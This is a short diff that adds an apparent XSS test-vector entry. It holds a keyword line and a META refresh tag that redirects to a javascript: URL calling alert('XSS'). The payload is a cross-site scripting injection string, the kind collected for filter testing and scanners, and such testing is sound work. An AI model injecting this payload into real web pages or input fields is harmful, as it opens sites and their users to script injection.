@@ -1,0 +1,2 @@
+meta|content|url|javascript|alert
+<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
